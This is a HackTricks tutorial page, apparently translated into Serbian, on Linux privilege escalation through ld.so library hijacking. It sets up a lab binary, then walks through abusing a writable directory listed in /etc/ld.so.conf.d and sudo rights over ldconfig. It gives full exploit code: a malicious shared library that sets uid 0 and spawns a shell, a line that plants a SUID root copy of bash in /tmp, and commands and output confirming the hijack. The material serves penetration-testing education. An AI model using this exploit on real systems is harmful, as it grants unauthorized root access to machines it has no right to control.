# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

## Priprema okruženja

U sledećem odeljku možete pronaći kod datoteka koje ćemo koristiti za pripremu okruženja.

{{#tabs}}
{{#tab name="sharedvuln.c"}}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{{#endtab}}

{{#tab name="libcustom.h"}}
```c
#include <stdio.h>

void vuln_func();
```
{{#endtab}}

{{#tab name="libcustom.c"}}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{{#endtab}}
{{#endtabs}}

1. **Kreirajte** te fajlove na svojoj mašini u istoj fascikli
2. **Kompajlirajte** **biblioteku**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Kopirajte** `libcustom.so` u `/usr/lib` i osvežite keš: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privilegije)
4. **Kompajlirajte** **izvršni fajl**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Proverite okruženje

Proverite da li se _libcustom.so_ **učitava** iz _/usr/lib_ i da li možete da **izvršite** binarni fajl.
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
### Korisne triage komande

Prilikom napada na stvarnu metu, proverite **tačan naziv biblioteke** koja je potrebna binarnom fajlu i šta loader **trenutno razrešava**:
```bash
readelf -d ./sharedvuln | grep NEEDED
ldconfig -p | grep libcustom
/lib64/ld-linux-x86-64.so.2 --list ./sharedvuln 2>/dev/null \
# x86_64; adjust for your arch
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
```
Nekoliko korisnih napomena:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` obično **ne funkcioniše** zato što redirekciju izvršava vaš trenutni shell. Umesto toga koristite
`echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
- **SUID/privileged** binarni fajlovi ignorišu `LD_LIBRARY_PATH`/`LD_PRELOAD` u
**secure-execution mode**, ali direktorijumi koji potiču iz `/etc/ld.so.conf` i dalje su deo pouzdane konfiguracije loadera, tako da ova pogrešna konfiguracija i dalje može da utiče na privileged programe.
- U novijim verzijama glibc-a, dynamic loader takođe omogućava
`--list-diagnostics`, što je korisno za debugovanje rezolucije cache-a i izbora `glibc-hwcaps` poddirektorijuma kada hijack ne funkcioniše očekivano.

## Exploit

U ovom scenariju pretpostavićemo da je **neko kreirao ranjiv unos** unutar fajla u _/etc/ld.so.conf/_:
```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```
Ranjivi folder je _/home/ubuntu/lib_ (gde imamo pristup za upis).\
**Preuzmite i kompajlirajte** sledeći kod unutar te putanje:
```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
setuid(0);
setgid(0);
puts("I'm the bad library");
system("/bin/sh");
}
```
Ako očekujete da će **root** (ili neki drugi privilegovani nalog) kasnije izvršiti ranjivu binarnu datoteku, obično je bolje ostaviti artefakt u vlasništvu korisnika **root** umesto pokretanja interaktivnog shell-a. Na primer:
```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```
Zatim, nakon što se izvršavanje sa privilegijama obavi, možete koristiti `/tmp/rootbash -p`.

Sada kada smo **kreirali zlonamernu biblioteku libcustom unutar pogrešno konfigurisane** putanje, potrebno je da sačekamo **restart sistema** ili da root korisnik izvrši **`ldconfig`** (_u slučaju da ovu binarnu datoteku možete izvršiti kao **sudo** ili ona ima **suid bit**, moći ćete da je izvršite sami_).

Nakon toga **ponovo proverite** odakle izvršna datoteka `sharedvuln` učitava biblioteku `libcustom.so`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Kao što možete videti, **učitava je iz `/home/ubuntu/lib`**, a ako je bilo koji korisnik izvrši, biće pokrenut shell:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
> [!TIP]
> Imajte na umu da u ovom primeru nismo eskalirali privilegije, ali ćemo izmenom izvršenih komandi i **čekanjem da root ili drugi privilegovani korisnik izvrši ranjivi binarni fajl** moći da eskaliramo privilegije.

### Druge pogrešne konfiguracije - Ista ranjivost

U prethodnom primeru smo lažirali pogrešnu konfiguraciju u kojoj je administrator **postavio folder bez privilegija unutar konfiguracionog fajla u `/etc/ld.so.conf.d/`**.\
Ali postoje i druge pogrešne konfiguracije koje mogu izazvati istu ranjivost. Ako imate **dozvole za upis** u neki **konfiguracioni fajl** unutar `/etc/ld.so.conf.d`, u folder `/etc/ld.so.conf.d` ili u fajl `/etc/ld.so.conf`, možete konfigurisati istu ranjivost i iskoristiti je.

## Exploit 2

**Pretpostavimo da imate sudo privilegije nad `ldconfig`**.\
Možete navesti **gde da učita conf fajlove**, pa to možemo iskoristiti da nateramo `ldconfig` da učita proizvoljne foldere.\
Dakle, napravimo fajlove i foldere potrebne za učitavanje foldera "/tmp":
```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Sada, kao što je navedeno u **prethodnom exploit-u**, **kreirajte zlonamernu biblioteku unutar `/tmp`**.\
I na kraju, učitajmo putanju i proverimo odakle binarni fajl učitava biblioteku:
```bash
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Kao što možete videti, ako imate sudo privilegije nad `ldconfig`, možete iskoristiti istu ranjivost.**



## Reference

- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
{{#include ../../banners/hacktricks-training.md}}
